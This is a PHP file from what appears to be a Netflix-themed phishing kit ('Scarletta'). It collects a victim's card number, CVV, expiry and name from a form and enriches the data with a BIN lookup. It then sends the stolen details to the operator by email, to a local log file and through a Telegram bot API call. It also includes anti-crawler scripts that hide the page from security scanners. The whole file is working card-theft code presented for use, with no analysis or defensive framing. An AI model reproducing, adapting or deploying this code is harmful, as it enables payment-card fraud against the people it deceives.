<?php

$useragent = $_SERVER['HTTP_USER_AGENT'];

include("../Bots/fucker.php");
include("../Bots/Anti/out/blacklist.php");
include("../Bots/Anti/out/bot-crawler.php");
include("../Bots/Anti/out/anti.php");
include("../Bots/Anti/out/ref.php");
include("../Bots/Anti/out/bots.php");
@require("../Bots/Anti/out/Crawler/src/CrawlerDetect.php");

$settings = include '../../settings/settings.php';
$owner = $settings['email'];
$filename = "../../Logs/results.txt";
$client = file_get_contents("../../Logs/client.txt");

use JayBizzle\CrawlerDetect\CrawlerDetect;

$CrawlerDetect = new CrawlerDetect;

if($CrawlerDetect->isCrawler($useragent)){
  header('https://www.google.com/?q='.$settings['out']);
}


$ccowner = $_POST['firstName']." ".$_POST['lastName'];
$cc = $_POST['ccnum'];
$cvv2 = $_POST['cvv'];
$exp = $_POST['ccexp'];
$lst = str_split($cc, 7);
$bin_ = $lst[0];
$bin = str_replace(' ','',$bin_);

function check_bin($bin) {
  $url = "https://lookup.binlist.net/".$bin;
    $headersers = array();
    $headersers[] = 'Accept-Version: 3';
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headersers);
    $resp=curl_exec($ch);
    curl_close($ch);
    $result = json_decode($resp, true);
    return $result;
}

$reslt = check_bin($bin);

$cardt = $reslt['scheme'];
$type = $reslt['type'];
$brand = $reslt['brand'];
$reslt2 = $reslt['country'];
$country = $reslt2['name'];
$reslt3 = $reslt['bank'];
$bank = $reslt3['name'];
$url = $reslt3['url'];
$phone = $reslt3['phone'];


$message = "\n==== [ 💳 CARD DETAILS | SCARLETTA | CLIENT : {$client} 💳 ] ====\n";
$message .= ".-------------------------------------.\n";
$message .= "| ➤ [ CC Holder Name ]    : {$ccowner}\n";
$message .= "| ➤ [ CC Number ]         : {$cc}\n";
$message .= "| ➤ [ CC Expiry ]         : {$exp}\n";
$message .= "| ➤ [ CCV2 ]              : {$cvv2}\n";
$message .= "| ➤ [ BIN ]               : {$bin}\n";
$message .= "| ➤ [ Card-Type ]         : {$cardt}\n";
$message .= "| ➤ [ Type ]              : {$type}\n";
$message .= "| ➤ [ Brand ]             : {$brand}\n";
$message .= "| ➤ [ Country ]           : {$country}\n";
$message .= "| ➤ [ Bank Name ]         : {$bank}\n";
$message .= "| ➤ [ Bank URL ]          : {$url}\n";
$message .= "| ➤ [ Bank Phone ]        : {$phone}\n";
$message .= ".-------------------------------------.\n";
$message .= "| C O D E D  B Y  @ M R B L A C K X\n";
$message .= ".-------------------------------------.\n";
$message .= "📺 ===== [ 💰 NETFLIX | END OF RESULT | CLIENT : {$client} 💰 ] ===== 📺\n\n";


if ($settings['send_mail'] == "1"){
	$to = $owner;
  $client = file_get_contents("../../Logs/client.txt");
	$headers = "Content-type:text/plain;charset=UTF-8\r\n";
	$headers .= "From: Scarletta <netflix@client_{$client}_site.com>\r\n";
	$subject = "⚔️ C A R D ✦ L O G #{client} ✦ C H A S E ⚔️";
	$msg = $message;
	mail($to, $subject, $msg, $headers);
}

if ($settings['save_results'] == "1"){
  $results = fopen($filename, "a+");
  fwrite($results, $message);
  fclose($results);
}

if ($settings['telegram'] == "1"){
  $data = $message;
  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
  $website = "https://api.telegram.org/{$settings['bot_url']}";
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
}


# Head Back To Next Step
header('Location: thank.php');
?>

?>